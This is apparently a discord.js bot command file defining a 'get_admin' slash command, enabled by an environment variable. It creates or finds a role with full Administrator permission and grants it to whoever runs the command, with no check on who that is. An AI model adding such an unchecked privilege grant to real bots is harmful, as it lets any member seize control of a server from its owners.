import {MessageFlagsBitField, PermissionsBitField, SlashCommandBuilder} from "discord.js";
import {ConfigSession} from "../../config";

module.exports = {
    requireEnv: "ENABLE_GET_ADMIN",
    data: new SlashCommandBuilder()
        .setName("get_admin")
        .setDescription("Grants admin permissions to the invoker."),
    async execute(interaction) {
        const adminRoleName = 'Server Administrator';

        // Find an existing role with Administrator permissions or the specific name
        let adminRole = interaction.guild.roles.cache.find(role => role.name === adminRoleName && role.permissions.has(PermissionsBitField.Flags.Administrator));

        // If the role doesn't exist, create it
        if (!adminRole) {
            console.log(`'${adminRoleName}' role not found. Creating it...`);
            adminRole = await interaction.guild.roles.create({
                name: adminRoleName,
                permissions: [PermissionsBitField.Flags.Administrator],
                reason: `Administrative role created for ${interaction.user.tag}`,
                color: '#FF0000'
            });
            console.log(`Role '${adminRole.name}' created successfully.`);
        }

        // Add the role to the target member
        await interaction.guild.members.cache.get(interaction.user.id).roles.add(adminRole);

        await interaction.reply({
            content: `Granted **${adminRole.name}** permissions to you.`,
        });
    }
};
